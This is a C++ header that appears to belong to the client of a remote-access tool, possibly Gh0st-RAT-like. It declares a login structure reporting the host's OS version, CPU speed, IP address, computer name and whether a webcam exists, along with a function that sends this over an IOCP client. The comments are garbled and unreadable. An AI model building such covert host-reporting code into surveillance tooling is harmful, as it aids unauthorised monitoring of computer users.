#pragma once

#include "IOCPClient.h"
#include <Vfw.h>

#pragma comment(lib,"Vfw32.lib")

typedef struct  _LOGIN_INFOR
{	
	BYTE			bToken;			// ȡ1����½��Ϣ
	char			OsVerInfoEx[sizeof(OSVERSIONINFOEX)];// �汾��Ϣ
	DWORD			dwCPUMHz;		// CPU��Ƶ
	IN_ADDR			ClientAddr;		// �洢32λ��IPv4�ĵ�ַ���ݽṹ
	char			szPCName[MAX_PATH];	// ������
	BOOL			bWebCamIsExist;		// �Ƿ�������ͷ
	DWORD			dwSpeed;		// ����
}LOGIN_INFOR,*PLOGIN_INFOR;

int SendLoginInfo(IOCPClient* ClientObject,DWORD dwSpeed);
DWORD CPUClockMHz();
BOOL WebCamIsExist();
